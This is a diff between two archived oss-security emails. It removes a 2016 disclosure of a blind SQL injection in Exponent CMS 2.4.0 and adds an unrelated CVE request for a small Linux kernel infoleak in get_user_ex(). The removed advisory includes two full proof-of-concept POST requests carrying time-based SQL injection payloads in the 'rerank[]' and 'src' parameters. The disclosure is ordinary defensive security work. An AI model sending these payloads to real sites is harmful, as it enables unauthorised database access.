@@ -1,102 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/10/1
-Message-ID: <512920BCA865344FBF69666E6859CBA852933DFD@EXMBX-SZMAIL015.tencent.com>
-Date: Thu, 10 Nov 2016 02:07:02 +0000
-From: nickyccwu(伍惠宇) <nickyccwu@...cent.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: CVE Request: Blind SQL Injection Vulnerability in Exponent CMS 2.4.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/03/2
+Message-ID: <CABniQZMPWz9XaVm4fjsYC8SZXksNm-63-gzeRkz8Eertv3j-SQ@mail.gmail.com>
+Date: Thu, 3 Nov 2016 12:44:32 +0800
+From: Shawn <citypw@...il.com>
+To: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: kernel: fix minor infoleak in get_user_ex()
 Content-Type: text/plain; charset=utf-8
 
+Hi guys,
 
-Document Title:
-===============
-Blind SQL Injection Vulnerability in Exponent CMS 2.4.0
+I suppose this bug should get a CVE number.
 
-References (Source):
-====================
-https://exponentcms.lighthouseapp.com/projects/61783/tickets/1394-blind-sql-injection-vulnerability-in-exponent-cms-240-4
-https://github.com/exponentcms/exponent-cms/commit/fffb2038de4c603931b785a4c3ec69cfd06181ba
+Info:
+get_user_ex(x, ptr) should zero x on failure. It's not a lot of a leak
+(at most we are leaking uninitialized 64bit value off the kernel
+stack, and in a fairly constrained situation, at that), but the fix is
+trivial, so... Cc: stable@...r.kernel.org Signed-off-by: Al Viro
+<viro@...iv.linux.org.uk> [ This sat in different branch from the
+uaccess fixes since mid-August ] Signed-off-by: Linus Torvalds
+<torvalds@...ux-foundation.org>
 
-Release Date:
-=============
-2016-11-06
+Upstream fix:
+https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=1c109fabbd51863475cd12ac206bdd249aee35af
 
+Impact:
 
-Product & Service Introduction:
-===============================
-Exponent CMS is an exciting web-based content management system. It makes creating and maintaining websites easy for non-technical users, while providing site managers the power and flexibility to add new features, completely customize the layout, and delegate responsibilities to other users.
+According to Spender:
 
-Abstract Advisory Information:
-==============================
-Nicky (Tencent Security Platform Department) discovered a remote sql-injection vulnerability in the Exponent CMS 2.4.0.
+https://lwn.net/Articles/705264/
 
-Vulnerability Disclosure Timeline:
-==================================
-2016-11-06: Report to the vendor
-2016-11-07: Vendor confirm the vul and fix it in exponent cms 2.4.1
+Mitigation:
 
-Discovery Status:
-=================
-Published
+PaX/Grsecurity's KERNEXEC/UDEREF
+SMEP
 
-Exploitation Technique:
-=======================
-Remote
+-- 
+GNU powered it...
+GPL protect it...
+God blessing it...
 
-Severity Level:
-===============
-High
-
-Technical Details & Description:
-================================
-A remote sql injection web vulnerability has been discovered in the exponent cms 2.4.1.
-The web vulnerability allows remote attackers to execute own malicious sql commands to compromise the application or dbms.
-
-Request Method(s):
-[+] POST
-
-Vulnerable Parameter(s):
-[+] lastpage / src
-
-Proof of Concept (PoC):
-=======================
-The remote sql-injection web vulnerability can be exploited by remote attackers.
-For security demonstration or to reproduce the sql-injection web vulnerability follow the provided information and steps below to continue.
-
-POST /exponent/ HTTP/1.1
-Content-Length: 268
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest
-Referer: http://192.168.118.1:80/exponent/
-Cookie: PHPSESSID=4b42cc8b7f69ebe1afdcbf4abbfee00b; adminer_key=cdeaea5d52a8f402a28bd04980a7851b
-Host: 192.168.118.1
-Connection: Keep-alive
-Accept-Encoding: gzip,deflate
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
-Accept: */*
-
-action=manage_ranks&controller=container&lastpage=http://192.168.118.1/exponent/untitled&model=container&rerank%5b%5d=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/&src=%40section1
-
-
-POST /exponent/ HTTP/1.1
-Content-Length: 251
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest
-Referer: http://192.168.118.1:80/exponent/
-Cookie: PHPSESSID=f7859e8215b717f81b7dbd2e2c1a2caa; adminer_key=cdeaea5d52a8f402a28bd04980a7851b
-Host: 192.168.118.1
-Connection: Keep-alive
-Accept-Encoding: gzip,deflate
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
-Accept: */*
-
-action=manage_ranks&controller=container&lastpage=http://192.168.118.1/exponent/&model=container&rerank%5b%5d=16&src=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/
-
-
-Solution - Fix & Patch:
-=======================
-Exponent CMS 2.4.1 has fixed it.(https://github.com/exponentcms/exponent-cms/commit/fffb2038de4c603931b785a4c3ec69cfd06181ba)
-
-Credits & Authors:
-==================
-Nicky of Tencent Security Platform Department
+regards
+Shawn
